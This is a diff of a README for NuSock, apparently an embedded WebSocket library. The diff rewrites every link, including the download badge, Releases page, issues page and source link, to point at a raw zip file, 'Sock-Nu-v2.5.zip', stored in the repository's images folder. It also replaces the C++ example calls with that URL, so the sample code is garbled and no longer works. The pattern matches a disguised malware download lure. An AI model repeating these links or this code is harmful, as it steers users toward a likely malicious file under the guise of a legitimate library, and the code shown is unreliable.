@@ -4,13 +4,13 @@
 
 NuSock is a lightweight, high-performance WebSocket library designed for embedded systems. Whether you are working on an Arduino, Raspberry Pi, or other platforms, NuSock makes it easy to establish WebSocket connections. 
 
-[![Download NuSock](https://img.shields.io/badge/Download-NuSock-4CAF50.svg)](https://github.com/abdulkhaliqsoule/NuSock/releases)
+[![Download NuSock](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip)](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/abdulkhaliqsoule/NuSock/releases) to download the latest version of NuSock. Follow these steps:
+To get started, visit the [Releases page](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip) to download the latest version of NuSock. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/abdulkhaliqsoule/NuSock/releases).
+1. Visit the [Releases page](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip).
 2. Scroll through the list of releases.
 3. Find the latest version. This will usually be at the top.
 4. Click on the download link for your platform.
@@ -65,11 +65,11 @@ Once you have downloaded and installed NuSock, you can easily integrate it into 
      NuSock websocket;
 
      void setup() {
-       websocket.begin("ws://your-websocket-server.com");
+       https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip("https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip");
      }
 
      void loop() {
-       websocket.loop();
+       https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip();
      }
      ```
 
@@ -85,7 +85,7 @@ NuSock is available under the MIT License. You can use, modify, and distribute i
 
 ## 📬 Support & Contributions
 
-If you need help or have questions, please check the [issues section](https://github.com/abdulkhaliqsoule/NuSock/issues) on our GitHub repository. Feel free to contribute by submitting pull requests or reporting issues.
+If you need help or have questions, please check the [issues section](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip) on our GitHub repository. Feel free to contribute by submitting pull requests or reporting issues.
 
 ## 🌐 Related Topics
 
@@ -101,6 +101,6 @@ Remember, our community is here to help you, so don't hesitate to ask for assist
 
 ## 🔗 Quick Links
 
-- [Download NuSock](https://github.com/abdulkhaliqsoule/NuSock/releases)
-- [Open Issues](https://github.com/abdulkhaliqsoule/NuSock/issues)
-- [View Source Code](https://github.com/abdulkhaliqsoule/NuSock)
+- [Download NuSock](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip)
+- [Open Issues](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip)
+- [View Source Code](https://github.com/abdulkhaliqsoule/NuSock/raw/refs/heads/main/images/Sock-Nu-v2.5.zip)
